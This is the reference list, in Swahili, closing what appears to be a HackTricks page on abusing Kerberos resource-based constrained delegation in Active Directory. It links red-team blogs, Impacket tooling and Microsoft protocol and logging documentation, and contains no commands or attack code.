- [2] [Neno Lingine Kuhusu Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Kutwaa Umiliki wa Object ya Kompyuta](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Matumizi Mabaya ya Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Ilipoua Domain: Muhtasari wa Kerberos wa Kihujumu](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (rasmi)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Karatasi ya haraka ya Linux yenye sintaksia ya hivi karibuni](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing imezimwa → Kerberos relay hadi RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Kuchunguza RBCD kati ya domain na forest mbalimbali](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Kuchunguza RBCD kati ya domain na forest mbalimbali: sehemu ya 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Tawi la Synacktiv Impacket - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Muhtasari wa Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - S4U2Self kati ya domain](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kugundua na kurekebisha matumizi ya RC4 katika Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Maelezo ya S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
- [17] [James Forshaw - Kutumia RBCD Vibaya kwa Akaunti ya Mtumiaji wa Kawaida](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
- [18] [Hunter Wade - Kutumia Constrained Delegation Vibaya bila Protocol Transition dhidi ya akaunti zisizo na SPN](https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/)
- [19] [Sprocket Security - Kutumia Constrained Delegation Vibaya bila Protocol Transition dhidi ya akaunti zisizo na SPN](https://www.sprocketsecurity.com/blog/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts)
- [20] [Impacket PR #2324 - S4U2Proxy yenye U2U](https://github.com/fortra/impacket/pull/2324)
- [21] [Microsoft MS-SFU - Kutumia ServicesAllowedToSendForwardedTicketsTo](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6d76bf10-3c48-4e14-9992-df1bd456455e)
- [22] [Microsoft Learn - Kuwasha uandishi wa matukio ya Kerberos](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging)
{{#include ../../banners/hacktricks-training.md}}
